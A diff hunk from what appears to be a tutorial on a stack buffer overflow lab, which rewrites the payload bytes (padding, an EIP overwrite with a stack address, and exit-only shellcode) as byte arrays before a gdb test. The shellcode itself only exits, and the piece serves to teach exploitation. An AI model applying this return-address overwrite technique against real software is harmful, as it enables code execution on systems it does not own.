@@ -247,9 +247,9 @@ echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x41\x41\x41\x41\x41\x28\xd0\xff\xff" > eg
 This hex-encoded sequence corresponds to our modified assembly instructions, which exit the program cleanly.
 
 Constructing the Payload:
-- `\x41\x41\x41\x41...` → Padding (filling the buffer) which represents ASCII ‘A’
-- `\x28\xd0\xff\xff` → Overwrite EIP with buffer address `0xffffd028`
-- `\x31\xc0\x40\x89\xc3\xcd\x80` → Shellcode to exit
+- [byte[]](0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41) → Padding (filling the buffer) which represents ASCII ‘A’
+- [byte[]](0x28, 0xD0, 0xFF, 0xFF) → Overwrite EIP with buffer address `0xffffd028`
+- [byte[]](0x31, 0xC0, 0x40, 0x89, 0xC3, 0xCD, 0x80) → Shellcode to exit
 
 ## 5. Running the Program in gdb
 Once our shellcode is prepared, we inject and execute it inside gdb to confirm that it works correctly.
